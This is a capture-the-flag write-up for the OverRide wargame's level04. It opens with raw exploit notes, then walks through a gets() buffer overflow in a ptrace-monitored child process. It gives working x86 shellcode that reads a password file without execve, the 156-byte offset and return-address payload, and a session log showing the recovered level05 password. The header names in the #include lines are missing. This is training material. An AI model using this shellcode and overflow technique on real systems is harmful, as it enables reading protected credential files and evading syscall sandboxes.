export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'

 #include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
printf("%p\n", getenv("SHELLCODE"));
}

(python -c "print 156 * 'a' + '\xff\xff\xc4\xde'[::-1]" )| ./level04


# Level 04

## Overview

This level implements a parent-child process architecture where the parent uses `ptrace()` to monitor the child and kill it if it attempts to execute system calls like `execve()`. Despite this protection, we can exploit a buffer overflow to execute shellcode stored in an environment variable.


## The Challenge

The Bug: gets(&buf) allows unlimited input into 128-byte buffer.
The Protection: Parent kills child if it detects execve() syscall (0xb).
The Bypass: Use shellcode with open()/read()/write() instead of execve().



### Key Vulnerabilities

Traditional shellcode won't work because it uses execve() (syscall 0xb), which the parent blocks. Instead, we use a custom shellcode that reads and prints the password file using allowed syscalls.

## Exploitation Process

**What it does:**
```c
fd = open("/home/users/level05/.pass", O_RDONLY);  // syscall 0x5
while (read(fd, &c, 1) > 0)                        // syscall 0x3
    write(1, &c, 1);                               // syscall 0x4
exit(0);                                           // syscall 0x1
```

**Shellcode (hexadecimal):**
```
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80
\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01
\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01
\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass
```
**Why this works:** Parent only monitors for `execve()` (0xb), so `open/read/write` syscalls are allowed.


## Step 1: Store Shellcode in Environment

```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

### Step 2: Find Shellcode Address

Create helper program:
```c
#include 
#include 

int main() {
    printf("%p\n", getenv("SHELLCODE"));
}
```

Compile and run:
```bash
gcc getenv.c -o getenv -m32
./getenv
# Output: 0xffffdec4 (example)
```

### Step 3: Find Buffer Offset

The buffer is 128 bytes, but we need the exact offset to the return address.

Testing shows: **156 bytes** to reach return address.

### Step 4: Exploit

```bash
(python -c "print 156 * 'a' + '\xc4\xde\xff\xff'"; cat) | ./level04
```

**Payload:**
- `156 * 'a'` - Fill buffer to return address
- `'\xc4\xde\xff\xff'` - Address of SHELLCODE 
- `cat` - Keep stdin open

---
# Solution

```bash
# 1. Store shellcode in environment
level04@OverRide:~$ export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'

# 2. Find shellcode address
level04@OverRide:~$ cat > getenv.c << 'EOF'
#include 
#include 
int main() { printf("%p\n", getenv("SHELLCODE")); }
EOF

level04@OverRide:~$ gcc getenv.c -o getenv -m32 && ./getenv
0xffffdec4

# 3. Run exploit (adjust address based on output)
level04@OverRide:~$ (python -c "print 156 * 'a' + '\xc4\xde\xff\xff'"; cat) | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting 
```

## Why Bypass Works

```
Parent monitors:      Our shellcode uses:
execve() = 0xb       open()  = 0x5 
                     read()  = 0x3 
                     write() = 0x4

Parent allows these syscalls!
```
